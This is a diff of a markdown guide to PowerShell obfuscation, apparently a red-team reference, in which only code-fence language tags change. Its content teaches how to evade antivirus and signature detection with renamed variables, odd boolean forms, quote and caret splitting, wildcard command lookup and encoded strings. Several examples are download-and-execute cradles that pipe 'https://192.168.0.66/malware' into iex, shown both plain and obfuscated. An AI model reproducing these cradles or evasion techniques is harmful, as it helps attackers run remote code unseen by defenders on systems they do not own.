@@ -36,7 +36,7 @@ It is important to understand this concept because, when obfuscating code, you s
 A principle to keep in mind: **The greater the entropy, the more likely the data is obfuscated or encrypted, and the more probable the file/payload is malicious**. Fortunately, there are ways to lower it.  
   
 `Claude E. Shannon` introduced a formula in his 1948 paper `A Mathematical Theory of Communication` which can be used to measure the entropy in a set of data. Here's a simple Python implementation of the `Shannon Entropy` you can use to measure the entropy of the payloads you develop:
-```
+```python
 #!/bin/python3
 # Usage: python3 entropy.py <file>
 
@@ -102,7 +102,7 @@ This variation also has all variable names replaced but this time with names con
   
 You can use the script below to randomize the names of variables in a PowerShell script. ⚠️ The script is not perfect! If you run it against large, complex PowerShell scripts it might break their functionality by replacing stuff it shouldn't. Use it with caution and be mindful.
   
-```
+```python
 #!/bin/python3
 #
 # This script is an example. It is not perfect and you should use it with caution.
@@ -157,7 +157,7 @@ main()
 ## Obfuscate Boolean Values
 It's super fun and easy to replace `$True` and `$False` values with other boolean equivalents, which are literaly unlimited. Especially if you have identified the detection trigger in a given payload and that includes a `$True` or `$False` value, you will probably be able to bypass detection by simply replacing it with a boolean substitute. All of the examples below evaluate to `True`. You can reverse them to `False` by simply adding an exclamation mark before the expression (e.g., `![bool]0x01`):
  - Boolean typecast of literally anything that is not `0` or `Null` or an `empty string`, will return `True`:
- ```
+ ```powershell
  [bool]1254
  [bool]0x12AE
  [bool][convert]::ToInt32("111011", 2) # Converts a string to int from base 2 (binary)
@@ -175,7 +175,7 @@ It's super fun and easy to replace `$True` and `$False` values with other boolea
  # Well, you get the point.
  ```
  - Boolean typecast of any class will return `True` as well:
- ```
+ ```powershell
  [bool][bool]
  [bool][char]
  [bool][int] 
@@ -188,20 +188,20 @@ It's super fun and easy to replace `$True` and `$False` values with other boolea
  [bool][datetime]
  ```
  - The result of a comparison that evaluates to `True` (duh):
- ```
+ ```powershell
  (9999 -eq 9999)
  ([math]::Round([math]::PI) -eq (4583 - 4580))
  [Math]::E -ne [Math]::PI
  ```
  - Or you can just grab a `True` value from an object's attributes:
- ```
+ ```powershell
  $x = [System.Data.AcceptRejectRule].Assembly.GlobalAssemblyCache
  $x = [System.TimeZoneInfo+AdjustmentRule].IsAnsiClass
  $x = [mailaddress].IsAutoLayout
  $x = [ValidateCount].IsVisible
  ```
  - You can mix all this stuff and weird things up by composing hideous ways to state `True` or `False`:
- ```
+ ```powershell
  [bool](![bool]$null)
  [System.Collections.CaseInsensitiveComparer] -ne [bool][datetime]'2023-01-01'
  [bool]$(Get-LocalGroupMember Administrators)
@@ -211,7 +211,7 @@ It's super fun and easy to replace `$True` and `$False` values with other boolea
 
 ## Cmdlet Quote Interruption
 You can obfuscate cmdlets by adding single and/or double quotes in between their characters, as long as it's not at the beginning. It's super effective! For example, the expresion `iex "pwd"` can be substituted with:
-```
+```powershell
 i''ex "pwd"
 i''e''x "pwd"
 i''e''x'' "pwd"
@@ -236,7 +236,7 @@ ie""x'' "p`"`"w''d`"`""
 
 ## Cmdlet Caret Interruption
 This is a bit dirty but might come in handy. In a Windows CMD terminal, it is possible to append the caret (^) symbol in-between a command's characters and it will still be interpreted normally. In a powershell script, one way to utilize this would be:
-```
+```powershell
 cmd /c "who^am^i"
 ```
 ![Untistled](https://github.com/t3l3machus/PowerShell-Obfuscation-Bible/assets/75489922/2868e8a7-c09e-4056-a8e8-8b3a8bd8fcbc)
@@ -246,34 +246,34 @@ cmd /c "who^am^i"
 
 ## Get-Command Technique
 A really cool trick my friend and mighty haxor Karol Musolff ([@kmusolff](https://github.com/kmusolff)) showed me. You can use `Get-Command` (or `gcm`) to retrieve the name (string) of any command, including all of the non-PowerShell files in the Path environment variable (`$env:Path`) by using wildcards. You can then run them as jobs with the `&` operator. For example, the following line:
-```
+```powershell
 Invoke-RestMethod -uri https://192.168.0.66/malware | iex
 ```
 Could be obfuscated to:
-```
+```powershell
 &(Get-Command i????e-rest*) -uri https://192.168.0.66/malware | &(gcm i*x)
 ```
 Or even better, this one, that has a lower `Shannon entropy` value:
-```
+```powershell
 &(Get-Command i************************************************************e-rest*) -uri https://192.168.0.66/malware | &(gcm i*x)
 ```
 
 ## Substitute Loops
 There are certain loops that can be substituted with other loop types or functions. For example, a `While ($True){ # some code }` loop can be substituted with the following:  
 **An infinite For loop**
-```
+```powershell
 For (;;) { # some code }
 ```
 **A Do-While loop**
-```
+```powershell
 Do { # some code } While ($true)
 ```
 **A Do-Until loop**
-```
+```powershell
 Do { # some code } Until (1 -eq 2)
 ```
 **A recursive function**
-```
+```powershell
 function runToInfinity { 
  # do something;  
  runToInfinity;
@@ -284,26 +284,26 @@ function runToInfinity {
 
 ### Add/Remove parameters
 You can try adding parameters to a cmdlet. For example, the following line:
-```
+```powershell
 iex "whoami"
 ```
 
 Could be expanded to:
-```
+```powershell
 iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire "whoami"
 ```
 You may of course try the opposite.
 
 ### Append random objects
 You can "pollute" a script with random variables and functions. Assume the following script as malicious:  
-```
+```powershell
 $b64 = $(irm -uri http://192.168.0.66/malware); 
 $virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));
 iex $virus;
 ```
 
 You might be able to break its signature by doing something like:
-```
+```powershell
 $b64 = $(irm -uri http://192.168.0.66/malware); sleep 0.01;sleep 0.01;Get-Process | Out-Null;
 $virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));sleep 0.01;sleep 0.01;Measure-Object | Out-Null;
 iex $virus;
@@ -315,7 +315,7 @@ You can always look for commands or even whole code blocks in a script that you 
 ![image](https://user-images.githubusercontent.com/75489922/231549917-26ec7969-f2ea-4fbc-ae00-931e92947064.png)
 
 The `(pwd).Path` part can be replaced by the following weird, unorthodox little script and although it even includes `pwd` it does serve our purpose of breaking the signature while maintaining the functionality of the script:
-```
+```powershell
 "$($p = (Split-Path `"$(pwd)\\0x00\`");if ($p.trim() -eq ''){echo 'C:\'}else{echo $p})"
 ```  
 There are of course simpler substitutes for `pwd` like `gl`, `get-location` and `cmd.exe /c chdir` that could do the trick, especially in combination with other techniques.
@@ -326,12 +326,12 @@ There's no end to what one can do with strings. Find below some interesting conc
 ### Convert string to here-string  
 At the expense of adding a few new lines, you can turn a string into a here-string.  
 This:  
-```
+```powershell
 $x = 'echo malware';
 iex $x;
 ```
 Is the same as:
-```
+```powershell
 $x = 'echo malware';
 iex @"
 $x
@@ -339,37 +339,37 @@ $x
 ```
 
 ### Reverse Strings
-```
+```powershell
 $x="Your string reversed".ToCharArray(); [array]::reverse($x); $x -join ""
 ```
 
 
 ### Concatenation
 Pretty straightforward and classic:
-```
+```powershell
 'mal' + 'w' + 'ar' + 'e'
 ```
 
 ### Get string from substring:
 Add the desired value between an irrelevant string and use `substring()` to extract it based on start - end indexes:
-```
+```powershell
 'xxxmalwarexxx'.Substring(3,7)
 ```
 
 ### Replace string by regex match:
 Create a junk string and replace it with the desired value via regex matching:
-```
+```powershell
 'a123' -replace '[a-zA-Z]{1}[\d]{1,3}','malware'
 ```
 
 ### Base64 decode the desired string:
 Encode your string and decode it within the script:
-```
+```powershell
 [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("bWFsd2FyZQ=="))
 ```
 
 ### Get the desired string's chars from bytes:
-```
+```powershell
 "$([char]([byte]0x6d)+[char]([byte]0x61)+[char]([byte]0x6c)+[char]([byte]0x77)+[char]([byte]0x61)+[char]([byte]0x72)+[char]([byte]0x65))"
 ```
 That's only to get you started. To be continued...
@@ -398,7 +398,7 @@ These strings may be found in comments as well, so it's a good idea to remove th
 
 ## Randomize Char Cases
 Probably the oldest trick in the book. Randomazing the character case of cmdlets and parameters might help:
-```
+```powershell
 inVOkE-eXpReSSioN -vErbOse "WHoAmI /aLL" -dEBug
 ```
 
